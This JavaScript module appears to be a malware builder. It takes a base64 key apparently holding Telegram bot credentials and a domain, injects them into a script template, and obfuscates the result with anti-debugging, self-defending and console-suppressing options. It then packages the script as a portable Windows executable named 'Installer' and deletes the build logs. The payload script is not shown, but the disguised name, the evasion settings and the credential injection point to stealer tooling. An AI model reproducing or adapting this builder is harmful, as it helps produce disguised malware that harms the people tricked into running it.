
const
    { build, Platform, Arch } = require('electron-builder'),
    fs = require('fs'),
    { base64toJson, createId } = require("../../utils/all.js"),
    JavaScriptObfuscator = require('javascript-obfuscator');

async function Build(key, domain) {
    return new Promise(async (resolve, reject) => {
        const { token, chat } = base64toJson(key);
        if (!token && !chat) return resolve(false);
        const
            id = createId(),
            start = new Date(),
            replaced = fs.readFileSync(`./build/script/index.js`).toString().replace('%key%', key).replace('%domain%', domain),
            obfuscationResult = JavaScriptObfuscator.obfuscate(replaced, { "ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": true, "deadCodeInjectionThreshold": 0.01, "debugProtection": true, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": true, "renameGlobals": true, "selfDefending": true, "simplify": true, "splitStrings": true, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false }),
            payload = obfuscationResult.getObfuscatedCode(),
            package = fs.readFileSync(`./build/script/package.json`);

        try {
            fs.mkdirSync(`./build/dist/${id}`, function (err) { if (err) return });
            fs.mkdirSync(`./build/script/${id}`, function (err) { if (err) return });
            fs.writeFileSync(`./build/script/${id}/index.js`, payload, function (err) { if (err) return });
            fs.writeFileSync(`./build/script/${id}/package.json`, package, function (err) { if (err) return });
        } catch (error) {
            console.log(error);
            return resolve(false);
        }
        const buildProcess = build({
            targets: Platform.WINDOWS.createTarget(null, Arch.x64),
            config: {
                appId: 'Installer',
                productName: 'Installer',
                win: {
                    icon: "./assets/icon.ico",
                    artifactName: `${id}.exe`,
                    target: 'portable'
                },
                compression: 'normal',
                buildVersion: '1.0.0',
                electronVersion: '17.1.0',
                nodeGypRebuild: false,
                npmRebuild: false,
                directories: {
                    app: `./build/script/${id}`,
                    output: `./build/dist/${id}`
                }
            }
        });
        buildProcess.then(() => {
            try {
                fs.unlinkSync(`./build/dist/${id}/builder-debug.yml`, function (err) { if (err) return });
                fs.unlinkSync(`./build/dist/${id}/builder-effective-config.yaml`, function (err) { if (err) return });
                fs.rmdirSync(`./build/dist/${id}/win-unpacked`, { recursive: true }, function (err) { if (err) return });
                fs.rmdirSync(`./build/script/${id}`, { recursive: true }, function (err) { if (err) return });
            } catch (error) {

            }

            const
                end = new Date(),
                diff = end - start,
                seconds = Math.round(diff / 1000),
                minutes = Math.floor(seconds / 60),
                remainingSeconds = seconds % 60;
            return resolve({ time: `${minutes}m ${remainingSeconds}s`, id });
        }).catch((err) => {
            console.log(err);
            return resolve(false);
        });
    });
};


module.exports = Build


